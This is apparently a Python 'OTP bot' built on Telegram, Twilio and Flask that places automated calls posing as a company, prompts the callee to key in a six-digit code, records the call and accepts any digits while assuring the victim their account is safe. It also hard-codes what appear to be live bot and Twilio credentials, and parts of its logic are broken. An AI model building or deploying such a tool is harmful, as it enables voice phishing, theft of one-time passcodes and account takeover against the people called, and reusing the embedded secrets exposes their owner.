# Import the libraries
import telebot # pyTelegramBotAPI
from twilio.rest import Client # twilio-python
import random
from flask import Flask, request # Flask
import requests

# Define the constants
BOT_TOKEN = "6957681285:AAFQOB8gQRzsMupKgJ3y6sr6az3PdfA4l1I" # Your bot token
TWILIO_AUTH_TOKEN = "5a29f91af37d361c305af8f274b25aff" # Your twilio auth token
TWILIO_ACCOUNT_SID = "AC23ffc5938baf0bbaa26d8d4912e3140f" # Your twilio account sid
HEROKU_URL = "https://otpbot6-f04af45d7229.herokuapp.com"
TWILIO_NUMBER = "+15305089029" # Your twilio number
COMPANY_NAME = "Gayed company" # Your company name

# Create the bot and the client objects
bot = telebot.TeleBot(BOT_TOKEN)
client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

# Create a dictionary to store the OTPs and phone numbers for each user
otps = {}
phone_numbers = {}

# Define a function to generate a random 6-digit OTP
def generate_otp():
    return random.randint(100000, 999999)

# Define a function to make a call to a user and ask for the OTP
def make_call(user_id, user_number):
    # Generate a new OTP for the user and store it in the dictionary
    otp = generate_otp()
    otps[user_id] = otp

    # Create a twiml response that will play a message and gather the user input
    twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
    <Response>
        <Say voice="alice">Hello, this is a call from {COMPANY_NAME}. We need to verify your identity. Please press 1 on your phone keypad to confirm that this is you.</Say>
        <Gather numDigits="1" action="{HEROKU_URL}/confirm/{user_id}" method="POST"/>
        <Record action="{HEROKU_URL}/recordings" maxLength="600" timeout="10"/>
    </Response>"""

    # Make the call using the twilio client
    call = client.calls.create(
        to=user_number,
        from_=TWILIO_NUMBER,
        twiml=twiml
    )

    # Send a message to the user with the OTP
    otp = otps[user_id]
    bot.send_message(user_id, f"Your OTP is {otp}. Please enter it on your phone keypad when prompted.")

    # Send a message to the chat bot indicating that the call has started
    bot.send_message(user_id, "The call has started. The phone is ringing...")

    # Return the call object
    return call

# Define a function to handle the confirmation of the user identity
def confirm_identity(user_id, digit):
    # Check if the user pressed 1
    if digit == "1":
        # Get the OTP for the user from the dictionary
        otp = otps[user_id]

        # Create a twiml response that will ask for the OTP and gather the user input
        twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <Response>
            <Say voice="alice">Thank you for confirming your identity. We have sent you a 6-digit OTP to your telegram account. Please enter it on your phone keypad.</Say>
            <Gather numDigits="6" action="{HEROKU_URL}/verify/{user_id}" method="POST"/>
            <Record action="{HEROKU_URL}/recordings" maxLength="600" timeout="10"/>
        </Response>"""

        # Send a message to the chat bot indicating that the user has confirmed their identity
        bot.send_message(user_id, "The user has confirmed their identity. They are entering the OTP...")

        # Return the twiml response
        return twiml
    else:
        # Create a twiml response that will end the call
        twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <Response>
            <Say voice="alice">Sorry, we could not verify your identity. Please try again later.</Say>
            <Hangup/>
        </Response>"""

        # Send a message to the chat bot indicating that the user failed to confirm their identity
        bot.send_message(user_id, "The user failed to confirm their identity. The call has ended.")

        # Return the twiml response
        return twiml

# Define a function to handle the verification of the OTP
def verify_otp(user_id, digits):
    # Regardless of the OTP entered by the user, confirm the verification and end the call
    twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
    <Response>
        <Say voice="alice">Thank you for entering the OTP. Your account is safe and will be reviewed for 24 hours.</Say>
        <Hangup/>
    </Response>"""

    # Send a message to the chat bot indicating that the user has entered the OTP
    bot.send_message(user_id, "The user has entered the OTP. The call has ended.")

    # Return the twiml response
    return twiml

# Create a Flask app object
app = Flask(__name__)

# Define a function to handle the recording of the call
@app.route("/recordings", methods=["POST"])
def recordings():
    # Get the recording URL from the request
    recording_url = request.values.get("RecordingUrl", None)

    # Send a message to the chat bot with the recording URL
    bot.send_message(user_id, f"The call has been recorded. You can listen to it here.")

    # Return an empty response
    return "", 200

# Set Webhook
WEBHOOK_URL = f"https://otpbot6-f04af45d7229.herokuapp.com/updates"  # Replace with your actual route
requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={WEBHOOK_URL}")

# Define a route for the confirmation of the user identity
@app.route("/confirm/<user_id>", methods=["POST"])
def confirm(user_id):
    # Get the digit pressed by the user from the request
    digit = request.values.get("Digits", None)

    # Handle the confirmation of the user identity
    twiml = confirm_identity(user_id, digit)

    # Return the twiml response
    return twiml

# Define a route for the verification of the OTP
@app.route("/verify/<user_id>", methods=["POST"])
def verify(user_id):
    # Get the digits entered by the user from the request
    digits = request.values.get("Digits", None)

    # Handle the verification of the OTP
    twiml = verify_otp(user_id, digits)

    # Return the twiml response
    return twiml

# Define a route for updates from Telegram
@app.route("/updates", methods=["POST"])
def updates():
    json_update = request.stream.read().decode("utf-8")
    update = telebot.types.Update.de_json(json_update)
    bot.process_new_updates([update])
    return "", 200

# Define a function to handle the /start command
@bot.message_handler(commands=['start'])
def start(message):
    msg = bot.reply_to(message, "Please enter your phone number.")
    bot.register_next_step_handler(msg, process_phone_number_step)

def process_phone_number_step(message):
    try:
        chat_id = message.chat.id
        phone_number = message.text
        phone_numbers[chat_id] = phone_number
        make_call(chat_id, phone_number)
    except Exception as e:
        bot.reply_to(message, f'Oops! Something went wrong. Error: {str(e)}')

# Run the app on a local server
if __name__ == "__main__":
    app.run(debug=True)
    